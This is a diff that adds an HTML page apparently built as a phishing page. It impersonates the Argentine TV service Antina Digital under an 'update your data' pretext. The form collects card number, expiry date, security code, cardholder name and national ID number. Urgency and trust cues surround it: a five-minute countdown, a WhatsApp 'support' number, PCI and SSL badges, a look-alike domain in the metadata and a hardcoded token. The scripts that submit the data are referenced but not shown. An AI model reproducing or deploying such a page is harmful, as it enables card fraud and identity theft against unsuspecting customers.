@@ -1,0 +1,359 @@
+<html lang="es"><head>
+    <meta property="og:title" content="Antina Digital - Actualización de Datos">
+    <meta property="og:description" content="Actualizá fácilmente los datos de tu tarjeta para continuar disfrutando del servicio. Plataforma segura y rápida.">
+    <meta property="og:image" content="hhttps://i.ibb.co/pjgVJG3h/antina.png">
+    <meta property="og:url" content="https://actualizardatos.antina.digital/">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Actualizar Online</title>
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="stylesheet" type="text/css" href="/styles/bootstrap-3.3.7/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="/styles/fontawesome-free-5.9.0-web/all.css">
+    <link rel="stylesheet" type="text/css" href="/scripts/form-validator/theme-default.min.css">
+    <link rel="stylesheet" href="/styles/maquetado/foundation.min.css">
+    <link rel="stylesheet" href="/styles/maquetado/app.css">
+    <script type="text/javascript" src="/scripts/jquery-3.2.1.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="/styles/maquetado/formGenerico.css">
+    <script type="text/javascript" src="/scripts/lodash.js"></script>
+    <script type="text/javascript" src="/scripts/moment.min.js"></script>
+    <script type="text/javascript" src="/scripts/moment-with-locales.min.js"></script>
+    <script type="text/javascript" src="/scripts/sweetalert.min.js"></script>
+    <script type="text/javascript" src="/scripts/axios.min.js"></script>
+    <script type="text/javascript" src="/scripts/notify.min.js"></script><style type="text/css" id="notify-bootstrap">.notifyjs-bootstrap-base {
+    font-weight: bold;
+    padding: 8px 15px 8px 14px;
+    text-shadow: 0 1px 0 rgba(255, 255, 255, 0.5);
+    background-color: #fcf8e3;
+    border: 1px solid #fbeed5;
+    -webkit-border-radius: 4px;
+    -moz-border-radius: 4px;
+    border-radius: 4px;
+    white-space: nowrap;
+    padding-left: 25px;
+    background-repeat: no-repeat;
+    background-position: 3px 7px;
+}
+.notifyjs-bootstrap-error {
+    color: #B94A48;
+    background-color: #F2DEDE;
+    border-color: #EED3D7;
+    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAtRJREFUeNqkVc1u00AQHq+dOD+0poIQfkIjalW0SEGqRMuRnHos3DjwAH0ArlyQeANOOSMeAA5VjyBxKBQhgSpVUKKQNGloFdw4cWw2jtfMOna6JOUArDTazXi/b3dm55socPqQhFka++aHBsI8GsopRJERNFlY88FCEk9Yiwf8RhgRyaHFQpPHCDmZG5oX2ui2yilkcTT1AcDsbYC1NMAyOi7zTX2Agx7A9luAl88BauiiQ/cJaZQfIpAlngDcvZZMrl8vFPK5+XktrWlx3/ehZ5r9+t6e+WVnp1pxnNIjgBe4/6dAysQc8dsmHwPcW9C0h3fW1hans1ltwJhy0GxK7XZbUlMp5Ww2eyan6+ft/f2FAqXGK4CvQk5HueFz7D6GOZtIrK+srupdx1GRBBqNBtzc2AiMr7nPplRdKhb1q6q6zjFhrklEFOUutoQ50xcX86ZlqaZpQrfbBdu2R6/G19zX6XSgh6RX5ubyHCM8nqSID6ICrGiZjGYYxojEsiw4PDwMSL5VKsC8Yf4VRYFzMzMaxwjlJSlCyAQ9l0CW44PBADzXhe7xMdi9HtTrdYjFYkDQL0cn4Xdq2/EAE+InCnvADTf2eah4Sx9vExQjkqXT6aAERICMewd/UAp/IeYANM2joxt+q5VI+ieq2i0Wg3l6DNzHwTERPgo1ko7XBXj3vdlsT2F+UuhIhYkp7u7CarkcrFOCtR3H5JiwbAIeImjT/YQKKBtGjRFCU5IUgFRe7fF4cCNVIPMYo3VKqxwjyNAXNepuopyqnld602qVsfRpEkkz+GFL1wPj6ySXBpJtWVa5xlhpcyhBNwpZHmtX8AGgfIExo0ZpzkWVTBGiXCSEaHh62/PoR0p/vHaczxXGnj4bSo+G78lELU80h1uogBwWLf5YlsPmgDEd4M236xjm+8nm4IuE/9u+/PH2JXZfbwz4zw1WbO+SQPpXfwG/BBgAhCNZiSb/pOQAAAAASUVORK5CYII=);
+}
+.notifyjs-bootstrap-success {
+    color: #468847;
+    background-color: #DFF0D8;
+    border-color: #D6E9C6;
+    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAutJREFUeNq0lctPE0Ecx38zu/RFS1EryqtgJFA08YCiMZIAQQ4eRG8eDGdPJiYeTIwHTfwPiAcvXIwXLwoXPaDxkWgQ6islKlJLSQWLUraPLTv7Gme32zoF9KSTfLO7v53vZ3d/M7/fIth+IO6INt2jjoA7bjHCJoAlzCRw59YwHYjBnfMPqAKWQYKjGkfCJqAF0xwZjipQtA3MxeSG87VhOOYegVrUCy7UZM9S6TLIdAamySTclZdYhFhRHloGYg7mgZv1Zzztvgud7V1tbQ2twYA34LJmF4p5dXF1KTufnE+SxeJtuCZNsLDCQU0+RyKTF27Unw101l8e6hns3u0PBalORVVVkcaEKBJDgV3+cGM4tKKmI+ohlIGnygKX00rSBfszz/n2uXv81wd6+rt1orsZCHRdr1Imk2F2Kob3hutSxW8thsd8AXNaln9D7CTfA6O+0UgkMuwVvEFFUbbAcrkcTA8+AtOk8E6KiQiDmMFSDqZItAzEVQviRkdDdaFgPp8HSZKAEAL5Qh7Sq2lIJBJwv2scUqkUnKoZgNhcDKhKg5aH+1IkcouCAdFGAQsuWZYhOjwFHQ96oagWgRoUov1T9kRBEODAwxM2QtEUl+Wp+Ln9VRo6BcMw4ErHRYjH4/B26AlQoQQTRdHWwcd9AH57+UAXddvDD37DmrBBV34WfqiXPl61g+vr6xA9zsGeM9gOdsNXkgpEtTwVvwOklXLKm6+/p5ezwk4B+j6droBs2CsGa/gNs6RIxazl4Tc25mpTgw/apPR1LYlNRFAzgsOxkyXYLIM1V8NMwyAkJSctD1eGVKiq5wWjSPdjmeTkiKvVW4f2YPHWl3GAVq6ymcyCTgovM3FzyRiDe2TaKcEKsLpJvNHjZgPNqEtyi6mZIm4SRFyLMUsONSSdkPeFtY1n0mczoY3BHTLhwPRy9/lzcziCw9ACI+yql0VLzcGAZbYSM5CCSZg1/9oc/nn7+i8N9p/8An4JMADxhH+xHfuiKwAAAABJRU5ErkJggg==);
+}
+.notifyjs-bootstrap-info {
+    color: #3A87AD;
+    background-color: #D9EDF7;
+    border-color: #BCE8F1;
+    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3QYFAhkSsdes/QAAA8dJREFUOMvVlGtMW2UYx//POaWHXg6lLaW0ypAtw1UCgbniNOLcVOLmAjHZolOYlxmTGXVZdAnRfXQm+7SoU4mXaOaiZsEpC9FkiQs6Z6bdCnNYruM6KNBw6YWewzl9z+sHImEWv+vz7XmT95f/+3/+7wP814v+efDOV3/SoX3lHAA+6ODeUFfMfjOWMADgdk+eEKz0pF7aQdMAcOKLLjrcVMVX3xdWN29/GhYP7SvnP0cWfS8caSkfHZsPE9Fgnt02JNutQ0QYHB2dDz9/pKX8QjjuO9xUxd/66HdxTeCHZ3rojQObGQBcuNjfplkD3b19Y/6MrimSaKgSMmpGU5WevmE/swa6Oy73tQHA0Rdr2Mmv/6A1n9w9suQ7097Z9lM4FlTgTDrzZTu4StXVfpiI48rVcUDM5cmEksrFnHxfpTtU/3BFQzCQF/2bYVoNbH7zmItbSoMj40JSzmMyX5qDvriA7QdrIIpA+3cdsMpu0nXI8cV0MtKXCPZev+gCEM1S2NHPvWfP/hL+7FSr3+0p5RBEyhEN5JCKYr8XnASMT0xBNyzQGQeI8fjsGD39RMPk7se2bd5ZtTyoFYXftF6y37gx7NeUtJJOTFlAHDZLDuILU3j3+H5oOrD3yWbIztugaAzgnBKJuBLpGfQrS8wO4FZgV+c1IxaLgWVU0tMLEETCos4xMzEIv9cJXQcyagIwigDGwJgOAtHAwAhisQUjy0ORGERiELgG4iakkzo4MYAxcM5hAMi1WWG1yYCJIcMUaBkVRLdGeSU2995TLWzcUAzONJ7J6FBVBYIggMzmFbvdBV44Corg8vjhzC+EJEl8U1kJtgYrhCzgc/vvTwXKSib1paRFVRVORDAJAsw5FuTaJEhWM2SHB3mOAlhkNxwuLzeJsGwqWzf5TFNdKgtY5qHp6ZFf67Y/sAVadCaVY5YACDDb3Oi4NIjLnWMw2QthCBIsVhsUTU9tvXsjeq9+X1d75/KEs4LNOfcdf/+HthMnvwxOD0wmHaXr7ZItn2wuH2SnBzbZAbPJwpPx+VQuzcm7dgRCB57a1uBzUDRL4bfnI0RE0eaXd9W89mpjqHZnUI5Hh2l2dkZZUhOqpi2qSmpOmZ64Tuu9qlz/SEXo6MEHa3wOip46F1n7633eekV8ds8Wxjn37Wl63VVa+ej5oeEZ/82ZBETJjpJ1Rbij2D3Z/1trXUvLsblCK0XfOx0SX2kMsn9dX+d+7Kf6h8o4AIykuffjT8L20LU+w4AZd5VvEPY+XpWqLV327HR7DzXuDnD8r+ovkBehJ8i+y8YAAAAASUVORK5CYII=);
+}
+.notifyjs-bootstrap-warn {
+    color: #C09853;
+    background-color: #FCF8E3;
+    border-color: #FBEED5;
+    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAMAAAC6V+0/AAABJlBMVEXr6eb/2oD/wi7/xjr/0mP/ykf/tQD/vBj/3o7/uQ//vyL/twebhgD/4pzX1K3z8e349vK6tHCilCWbiQymn0jGworr6dXQza3HxcKkn1vWvV/5uRfk4dXZ1bD18+/52YebiAmyr5S9mhCzrWq5t6ufjRH54aLs0oS+qD751XqPhAybhwXsujG3sm+Zk0PTwG6Shg+PhhObhwOPgQL4zV2nlyrf27uLfgCPhRHu7OmLgAafkyiWkD3l49ibiAfTs0C+lgCniwD4sgDJxqOilzDWowWFfAH08uebig6qpFHBvH/aw26FfQTQzsvy8OyEfz20r3jAvaKbhgG9q0nc2LbZxXanoUu/u5WSggCtp1anpJKdmFz/zlX/1nGJiYmuq5Dx7+sAAADoPUZSAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfdBgUBGhh4aah5AAAAlklEQVQY02NgoBIIE8EUcwn1FkIXM1Tj5dDUQhPU502Mi7XXQxGz5uVIjGOJUUUW81HnYEyMi2HVcUOICQZzMMYmxrEyMylJwgUt5BljWRLjmJm4pI1hYp5SQLGYxDgmLnZOVxuooClIDKgXKMbN5ggV1ACLJcaBxNgcoiGCBiZwdWxOETBDrTyEFey0jYJ4eHjMGWgEAIpRFRCUt08qAAAAAElFTkSuQmCC);
+}
+</style>
+    <script type="text/javascript" src="/scripts/countdown.min.js"></script>
+    <script type="text/javascript" src="/scripts/numeral/numeral.min.js"></script>
+    <script type="text/javascript" src="/scripts/pagos/keys.js"></script>
+    <script type="text/javascript" src="/scripts/pagos/finalizar.js"></script>
+    <script type="text/javascript" src="/scripts/pagos/pago.js"></script>
+    <style type="text/css" id="core-notify">.notifyjs-corner {
+        position: fixed;
+        margin: 5px;
+        z-index: 1050;
+    }
+
+    .notifyjs-corner .notifyjs-wrapper,
+    .notifyjs-corner .notifyjs-container {
+        position: relative;
+        display: block;
+        height: inherit;
+        width: inherit;
+        margin: 3px;
+    }
+
+    .notifyjs-wrapper {
+        z-index: 1;
+        position: absolute;
+        display: inline-block;
+        height: 0;
+        width: 0;
+    }
+
+    .notifyjs-container {
+        display: none;
+        z-index: 1;
+        position: absolute;
+    }
+
+    .notifyjs-hidable {
+        cursor: pointer;
+    }
+
+    [data-notify-text],[data-notify-html] {
+        position: relative;
+    }
+
+    .notifyjs-arrow {
+        position: absolute;
+        z-index: 2;
+        width: 0;
+        height: 0;
+    }</style>
+</head>
+<body>
+<div class="main-wrapper">
+
+  <input type="hidden" id="payments-token" value="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IlRlbGNvbUdlc3Rpb24iLCJuYmYiOjE1Nzk4MDUwNTQsImV4cCI6MTU3OTgwODY1NCwiaWF0IjoxNTc5ODA1MDU0LCJpc3MiOiJodHRwczovL3BhZ29zLmFudGluYS5jb20uYXIiLCJhdWQiOiJodHRwczovL3BhZ29zLmFudGluYS5jb20uYXIifQ.Ww4mM9FZMI4i-LNM2w2nm7E4mP_NMpATYSz91XSBhtA">
+
+  <header>
+    <div class="logo">
+        <img src="/img/antina-logo.svg" alt="" width="320" height="58">
+        <p>ACTUALIZAR DATOS ONLINE</p>
+    </div>
+  </header>
+
+     <div class="timer-wrapper">
+       <div id="timer">05:00</div>
+     </div>
+
+<div class="text-center" id="form-payment-container">
+    <div class="container">
+        <div class="panel shaded" id="panel-shaded">
+            <div class="panel-body">
+                <form id="form-checkout">
+                    <input id="cardNumber" class="container-mp" placeholder="Número de tarjeta" maxlength="19" autocomplete="off" inputmode="number" >
+                    <div class="form-checkout-row">
+                        <input id="expireDate" maxlength="5" type="text"  placeholder="MM/YY">
+                        <input id="cvv" class="container-mp" maxlength="4" autocomplete="off" inputmode="numeric" placeholder="Código de seguridad"  >
+                    </div>
+                    <input id="cardHolder" class="container-mp" placeholder="Titular de la tarjeta" maxlength="25" autocomplete="off" inputmode="number" >
+                    <input id="dni" class="container-mp" placeholder="Número del documento" maxlength="9" autocomplete="off" inputmode="number" title="Ingrese correctamente el DNI para evitar errores">
+               </form>
+            </div>
+        </div>
+    </div>
+    <div class="boton-recargar">
+        <a id="btnPagar" class="boton">Actualizar</a>
+        <input class="boton none" type="button" id="btnVolver" value="Volver">
+    </div>
+</div>
+
+<a href="https://wa.me/5492657290736" target="_blank" id="whatsapp-support">
+    <img src="/img/whatsapp.png" alt="WhatsApp">
+    <span>SOPORTE</span>
+</a>
+
+<style>
+#whatsapp-support {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    background-color: #25d366;
+    color: white;
+    padding: 10px 14px;
+    border-radius: 50px;
+    font-weight: bold;
+    font-family: sans-serif;
+    font-size: 14px;
+    text-decoration: none;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    z-index: 9999;
+}
+
+#whatsapp-support img {
+    width: 20px;
+    height: 20px;
+}
+
+@media (max-width: 480px) {
+    #whatsapp-support {
+        font-size: 12px;
+        padding: 8px 12px;
+        gap: 6px;
+    }
+
+    #whatsapp-support img {
+        width: 18px;
+        height: 18px;
+    }
+}
+</style>
+<footer>
+  <div class="footer-content">
+    <div class="footer-left">
+      <p><strong>Medios de pago aceptados</strong></p>
+      <div class="payment-methods">
+        <img src="/img/naranja.png" alt="Naranja" />
+        <img src="/img/cabal.png" alt="Cabal" />
+        <img src="/img/mastercard.png" alt="MasterCard" />
+        <img src="/img/visa.png" alt="Visa" />
+        <img src="/img/amex.png" alt="Amex" />
+      </div>
+    </div>
+    <div class="footer-badges">
+      <img src="/img/pci.png" alt="Certificación PCI" />
+      <img src="/img/SSL.png" alt="Certificado SSL" />
+    </div>
+  </div>
+  <p>© 2025 Antina Digital. Todos los derechos reservados.</p>
+  <p>Este sitio utiliza encriptación segura y cumple con estándares de protección de datos.</p>
+</footer>
+<!-- Botón de comentarios -->
+<div class="feedback-section">
+  <button id="feedback-btn">💬</button>
+</div>
+
+<!-- Modal de comentarios -->
+<div id="feedback-modal" class="feedback-modal hidden">
+  <form id="feedback-form">
+    <input type="text" id="nombre" placeholder="Nombre completo" required />
+    <input type="email" id="email" placeholder="Correo electrónico" required />
+    <input type="tel" id="telefono" placeholder="Teléfono (opcional)" />
+    <textarea id="mensaje" placeholder="Escribí tu comentario..." required></textarea>
+    <button type="submit">Enviar</button>
+  </form>
+</div>
+
+<style>
+  #feedback-btn {
+    position: fixed;
+    bottom: 20px;
+    left: 20px;
+    background: linear-gradient(135deg, #2c2f33, #23272a);
+    color: #ffffff;
+    padding: 12px 20px;
+    border: none;
+    border-radius: 10px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
+    transition: background 0.3s ease, transform 0.2s ease;
+    z-index: 9999;
+  }
+
+  #feedback-btn:hover {
+    background: linear-gradient(135deg, #1e2124, #2c2f33);
+    transform: scale(1.05);
+  }
+
+  .feedback-modal {
+    position: fixed;
+    bottom: 80px;
+    left: 20px;
+    background: #1e1f22;
+    border-radius: 12px;
+    padding: 18px 16px;
+    box-shadow: 0 8px 18px rgba(0, 0, 0, 0.5);
+    width: 280px;
+    z-index: 10000;
+    animation: fadeIn 0.3s ease-out;
+    color: #f1f1f1;
+  }
+
+  .feedback-modal.hidden {
+    display: none;
+  }
+
+  .feedback-modal input,
+  .feedback-modal textarea {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 10px;
+    font-size: 14px;
+    border: 1px solid #444;
+    border-radius: 8px;
+    background-color: #2c2f33;
+    color: #f1f1f1;
+    transition: border 0.2s ease;
+  }
+
+  .feedback-modal input:focus,
+  .feedback-modal textarea:focus {
+    border-color: #7289da;
+    outline: none;
+  }
+
+  .feedback-modal textarea {
+    resize: vertical;
+    min-height: 80px;
+  }
+
+  .feedback-modal button {
+    width: 100%;
+    padding: 10px;
+    background-color: #5865f2;
+    color: white;
+    font-weight: bold;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+
+  .feedback-modal button:hover {
+    background-color: #4752c4;
+  }
+
+  @keyframes fadeIn {
+    from {
+      opacity: 0;
+      transform: translateY(10px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+</style>
+
+<script>
+  const feedbackBtn = document.getElementById('feedback-btn');
+  const feedbackModal = document.getElementById('feedback-modal');
+  const feedbackForm = document.getElementById('feedback-form');
+
+  feedbackBtn.onclick = () => {
+    feedbackModal.classList.toggle('hidden');
+  };
+
+  feedbackForm.onsubmit = async (e) => {
+    e.preventDefault();
+    const nombre = document.getElementById('nombre').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const telefono = document.getElementById('telefono').value.trim();
+    const mensaje = document.getElementById('mensaje').value.trim();
+
+    if (!nombre || !email || !mensaje) {
+      return alert('Por favor, completá los campos requeridos.');
+    }
+
+    try {
+      await fetch('/comentario', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ nombre, email, telefono, mensaje })
+      });
+      alert('Comentario enviado. ¡Gracias!');
+      feedbackForm.reset();
+      feedbackModal.classList.add('hidden');
+    } catch (error) {
+      alert('Error al enviar comentario.');
+    }
+  };
+</script>
+
+</body>
